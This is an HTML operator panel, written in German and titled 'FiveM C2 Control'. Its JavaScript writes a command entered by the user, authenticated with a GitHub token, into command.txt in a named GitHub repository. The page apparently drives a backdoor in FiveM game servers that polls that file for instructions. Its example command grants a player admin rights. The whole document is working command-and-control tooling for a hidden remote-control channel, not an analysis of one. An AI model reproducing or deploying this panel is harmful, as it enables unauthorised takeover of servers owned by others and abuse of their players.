<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM C2 Control</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #2d2d2d; padding: 2.5rem; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); width: 90%; max-width: 450px; text-align: center; }
        h1 { color: #e74c3c; margin-bottom: 1.5rem; font-size: 1.8rem; }
        .input-group { margin-bottom: 1.5rem; text-align: left; }
        label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; color: #bdc3c7; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #555; border-radius: 6px; background-color: #444; color: #fff; box-sizing: border-box; font-size: 1rem; }
        button { width: 100%; padding: 12px; border: none; border-radius: 6px; background-color: #c0392b; color: white; font-size: 1rem; font-weight: bold; cursor: pointer; transition: background-color 0.3s ease; }
        button:hover { background-color: #a93226; }
        #status { margin-top: 1.5rem; font-size: 0.9rem; min-height: 20px; }
        .success { color: #2ecc71; }
        .error { color: #e74c3c; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 FiveM C2 Control</h1>
        <div class="input-group">
            <label for="tokenInput">GitHub Token</label>
            <input type="password" id="tokenInput" placeholder="Dein Personal Access Token">
        </div>
        <div class="input-group">
            <label for="commandInput">Befehl</label>
            <input type="text" id="commandInput" placeholder="z.B. add_principal identifier.steam:xxx group.admin">
        </div>
        <button onclick="sendCommand()">Senden</button>
        <div id="status">Bereit.</div>
    </div>

    <script>
        // --- KONFIGURATION (Bereits für dich angepasst) ---
        const GITHUB_USERNAME = "vSkeezy";
        const REPO_NAME = "fivem-c2";
        const COMMAND_FILE_PATH = "command.txt";

        const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${REPO_NAME}/contents/${COMMAND_FILE_PATH}`;

        async function sendCommand() {
            const token = document.getElementById('tokenInput').value;
            const command = document.getElementById('commandInput').value;
            const statusDiv = document.getElementById('status');

            if (!token || !command) {
                statusDiv.textContent = '❌ Token und Befehl sind erforderlich.';
                statusDiv.className = 'error';
                return;
            }

            statusDiv.textContent = 'Sende...';
            statusDiv.className = '';

            try {
                const getFileResponse = await fetch(API_URL, {
                    headers: { 'Authorization': `token ${token}` }
                });

                if (!getFileResponse.ok) throw new Error(`Fehler beim Abrufen: ${getFileResponse.statusText}`);
                
                const fileData = await getFileResponse.json();

                const content = btoa(unescape(encodeURIComponent(command)));
                const body = JSON.stringify({
                    message: `Update command to: ${command}`,
                    content: content,
                    sha: fileData.sha
                });

                const updateResponse = await fetch(API_URL, {
                    method: 'PUT',
                    headers: {
                        'Authorization': `token ${token}`,
                        'Content-Type': 'application/json'
                    },
                    body: body
                });

                if (updateResponse.ok) {
                    statusDiv.textContent = '✅ Befehl gesendet!';
                    statusDiv.className = 'success';
                    document.getElementById('commandInput').value = '';
                } else {
                    const errorData = await updateResponse.json();
                    throw new Error(`Fehler beim Senden: ${updateResponse.statusText}. ${errorData.message}`);
                }

            } catch (error) {
                statusDiv.textContent = `❌ ${error.message}`;
                statusDiv.className = 'error';
            }
        }
    </script>
</body>
</html>
